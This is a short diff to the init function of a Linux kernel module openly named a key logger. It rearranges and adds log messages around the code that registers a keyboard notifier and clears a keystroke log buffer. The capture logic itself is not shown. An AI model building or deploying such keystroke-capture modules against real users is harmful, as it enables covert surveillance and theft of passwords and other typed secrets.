@@ -78,12 +78,12 @@ static int __init my_key_logger_init(void){
     printk(KERN_ALERT "%s: failed to create device\n", CLASS_NAME);
     return PTR_ERR(mkl_dev);
   }
+  printk(KERN_INFO "%s: device class created\n", CLASS_NAME);
 
   // register keyboard notifier
   register_keyboard_notifier(&nb);
   memset(log, 0, LOG_MAX);
-  
-  printk(KERN_INFO "%s: device class created\n", CLASS_NAME);
+  printk(KERN_INFO "%s: registered keyboard_notifier", CLASS_NAME);
   
   return 0;
 }
